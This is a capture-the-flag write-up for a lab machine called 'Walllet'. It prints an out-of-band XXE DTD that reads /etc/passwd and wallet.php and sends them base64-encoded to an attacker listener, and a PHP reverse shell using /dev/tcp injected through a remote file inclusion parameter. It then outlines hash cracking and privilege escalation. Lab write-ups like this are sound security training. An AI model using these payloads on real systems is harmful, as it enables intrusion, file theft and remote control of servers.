@@ -1,0 +1,144 @@
+---
+title: 'Walllet Writeup'
+date: '2025-02-28'
+tags: ['XXE', 'RFI', 'Linux', 'Hacking Club']
+draft: false
+summary: 'The application contains vulnerabilities including XXE, RFI, reverse shell, privilege escalation, RCE, cracked password, and unauthorized access to sensitive files.'
+images: ['/static/images/walllet-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/walllet-writeup-images/default.png)
+
+---
+
+## Port Scanning
+
+`nmap -sV -sC -p- -v $IP --open`
+
+![wallet](/static/images/walllet-writeup-images/image.png)
+
+---
+
+## Enumeration
+
+`http://172.16.8.243`
+
+![wallet 1](/static/images/walllet-writeup-images/image1.png)
+
+Registering a new user
+
+![wallet 2](/static/images/walllet-writeup-images/image2.png)
+
+After logging in, we gain access to the application. The `Reports` section stands out.
+
+![wallet 3](/static/images/walllet-writeup-images/image3.png)
+
+Intercepting with Burp shows that it's an XML request.
+
+![wallet 4](/static/images/walllet-writeup-images/image4.png)
+
+![wallet 5](/static/images/walllet-writeup-images/image5.png)
+
+Since the response came back empty, we can test for **Out-of-band XML External Entity (OOB XXE).**
+
+To test it, we'll create a `.dtd` file that will be referenced by the XML.
+
+`exploit.dtd`
+
+```python
+<!ENTITY % gabe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://10.0.31.150:1337/p?data=%gabe;'>">
+```
+
+```python
+<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "http://10.0.1.150/exploit.dtd"> %pe; %param1; ]>
+<foo>&external;</foo>
+```
+
+![wallet 6](/static/images/walllet-writeup-images/image6.png)
+
+```bash
+python3 -m http.server 80
+```
+
+![wallet 7](/static/images/walllet-writeup-images/image7.png)
+
+```bash
+nc -lnvp 1337
+```
+
+![wallet 8](/static/images/walllet-writeup-images/image8.png)
+
+Decoding the base64 output confirms it's the server's `/etc/passwd`.
+
+![wallet 9](/static/images/walllet-writeup-images/image9.png)
+
+Using the same process, we can read the `wallet.php` file, which contains the application code.
+
+`exploit.dtd`
+
+```python
+<!ENTITY % gabe SYSTEM "php://filter/convert.base64-encode/resource=wallet.php">
+<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://10.0.31.150:1337/p?data=%gabe;'>">
+```
+
+![wallet 10](/static/images/walllet-writeup-images/image10.png)
+
+Analyzing the code reveals a Remote File Inclusion (RFI) since it does a **require_once** on the **wallets_balance** parameter.
+
+---
+
+## Foot Hold
+
+Since we have an RFI, we create a reverse shell and pass it as the **wallet_balance** parameter.
+
+```python
+<?php system("/bin/bash -c 'sh -i >& /dev/tcp/10.0.31.150/1337 0>&1'"); ?>
+```
+
+![wallet 11](/static/images/walllet-writeup-images/image11.png)
+
+![wallet 12](/static/images/walllet-writeup-images/image12.png)
+
+```bash
+nc -lnvp 1337
+```
+
+![wallet 13](/static/images/walllet-writeup-images/image13.png)
+
+---
+
+## Pivoting
+
+Database password found in **config.php**.
+
+![wallet 14](/static/images/walllet-writeup-images/image14.png)
+
+Connecting to MySQL, we find the admin hash:
+
+`mysql -u satoshi -p`
+
+![wallet 15](/static/images/walllet-writeup-images/image15.png)
+
+Used John the Ripper to crack the hash.
+
+![wallet 16](/static/images/walllet-writeup-images/image16.png)
+
+`su admin`
+
+![wallet 17](/static/images/walllet-writeup-images/image17.png)
+
+---
+
+## Privillege Escalation
+
+`sudo -l`
+
+![wallet 18](/static/images/walllet-writeup-images/image18.png)
+
+---
+
+## Proof
+
+![wallet 19](/static/images/walllet-writeup-images/image19.png)
